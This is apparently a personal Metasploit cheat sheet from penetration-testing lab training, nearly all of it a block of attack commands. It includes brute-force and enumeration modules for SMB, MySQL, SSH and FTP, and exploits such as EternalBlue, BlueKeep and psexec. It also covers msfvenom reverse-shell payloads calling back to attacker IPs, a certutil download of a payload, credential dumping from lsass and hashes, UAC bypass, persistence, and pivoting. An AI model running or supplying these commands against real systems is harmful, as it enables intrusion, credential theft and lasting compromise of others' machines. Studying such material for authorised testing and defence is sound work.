---
dg-publish: true
---
# Metasploit Commands

```bash
msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS (IPaddress)
use auxiliary/scanner/smb/smb2
set RHOST (IPaddress)
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_login
set PASS_FILE (location of the file)
set SMBUser (username)
use auxiliary/scanner/smb/pipe_auditor
set SMBUser admin
set SMBPass (password)
use (Database name)
use auxiliary/scanner/mysql/mysql_schemadump
set USERNAME (username)
set PASSWORD ""
use auxiliary/scanner/mysql/mysql_writable_dirs
set DIR_LIST location
set VERBOSE false
use auxiliary/scanner/mysql/mysql_file_enum
set FILE_LIST (location)
use auxiliary/scanner/mysql/mysql_hashdump
use auxiliary/scanner/mysql/mysql_login
set PASS_FILE (file location)
set STOP_ON_SUCCESS true
msfconsole -q
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS 10.0.17.27
set HttpUsername bob
set HttpPassword password_123321
set PATH /webdav/metasploit%RAND%.asp
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS 10.0.0.242
use exploit/windows/smb/psexec
set SMBUser Administrator
set SMBPass qwertyuiop
meterpreter >
set the LHOST and LPORT
use exploit/windows/smb/ms17_010_eternalblue
use scanner/rdp/cve_2019_0708_bluekeep
use exploit/windows/rdp/cve_2019_0708_rce
set RHOSTS (ipaddress)
set target (number)
use auxiliary/scanner/winrm/winrm_login
set RHOSTS 10.0.0.173
use auxiliary/scanner/winrm/winrm_cmd
set USERNAME administrator
set PASSWORD tinkerbell
set CMD whoami
use exploit/windows/winrm/winrm_script_exec
set FORCE_VBS true
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.3 LPORT=4444 -f exe > 'backdoor.exe'
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.1.3
set LPORT 4444
meterpreter > migrate -N lsass.exe
meterpreter > shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.12.2 LPORT=1234 -f exe > payload.exe
service postgresql start && msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.12.2
set LPORT 1234
meterpreter > load kiwi
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.245.211.3
use auxiliary/scanner/ssh/ssh_login
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set VERBOSE true
Meterpreter Payload
FTP uses TCP port 21 and facilitates file sharing between a server and clients. We can use multiple auxiliary modules to enumerate information and perform brute-force attacks. FTP authentication uses a username/password combination, though improperly configured servers can sometimes be accessed anonymously.
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.51.147.3
use auxiliary/scanner/ftp/anonymous
MySQL is an open-source relational database management system based on SQL. Uses TCP port 3306 by default. We can use auxiliary modules to enumerate MySQL version, brute-force passwords, execute SQL queries, and more.
Msfvenom is a command line utility used to generate and encode MSF payloads for various operating systems and web servers. It's a combination of `msfpayload` and `msfencode`. We can generate a malicious meterpreter payload that connects back to our payload handler once executed on the target.
set LHOST 10.10.10.5
msfconsole -r handler.rc
use exploit/windows/http/rejetto_hfs_exec
set LPORT (attacker port)
set LHOST (attacker ip)
use auxiliary/scanner/smb/smb_ms17_010
set USER_FILE (location)
set PASS_FILE (location)
set USERNAME (uname)
set PASSWORD (password)
set CMD (command)
use exploit/multi/http/tomcat_jsp_upload_bypass
set payload java/jsp_shell_bind_tcp
set SHELL cmd
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(attacker IP) LPORT=(portnumber) -f exe > meterpreter.exe
certutil -urlcache -f http://(IPaddress)/meterpreter.exe meterpreter.exe
set LHOST (IPaddress)
set LPORT (portnumber)
use exploit/unix/ftp/vsftpd_234_backdoor
use post/multi/manage/shell_to_meterpreter
set SESSION 1
use exploit/linux/samba/is_known_pipename
use auxiliary/scanner/ssh/libssh_auth_bypass
set SPAWN_PTY true
use exploit/linux/smtp/haraka
set RHOST (ipaddress)
set LHOST (ipaddress)
set email_to root@attackdefense.test
set SRVPORT 9898
set payload linux/x64/meterpreter_reverse_http
use post/windows/manage/migrate   # migrate to a session
use post/windows/gather/win_privs
use post/windows/gather/enum_logged_on_users
set session 1
use post/windows/gather/checkvm
use post/windows/gather/enum_applications
use post/windows/gather/enum_av_excluded
use exploit/windows/local/bypassuac_injection
set session (session number)
set RHOSTS 10.0.28.7
set SMBUser (user name)
set SMBPass (paste the hash value)
use exploit/windows/local/persistence_service
set payload windows/meterpreter/reverse_tcp
use post/windows/manage/enable_rdp
set SESSION (session number)
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.27.99
set PORTS 1-100
meterpreter > background
use exploit/windows/http/badblue_passthru
set PAYLOAD windows/meterpreter/bind_tcp
set USERNAME (name)
use exploit/unix/local/chkrootkit
set SESSION 2
set CHKROOTKIT /bin/chkrootkit
use post/linux/manage/sshkey_persistence
set SESSION 4 (session num)
set CREATESSHFOLDER true
set RHOSTS 10.0.22.85
use exploit/unix/ftp/proftpd_133c_backdoor
set RHOSTS 192.229.31.3
use post/linux/gather/hashdump
use auxiliary/analyze/crack_linux
set SHA512 true
set RHOSTS 10.0.23.180
meterpreter > ipconfig
meterpreter > run autoroute -s 10.0.23.0/20
```
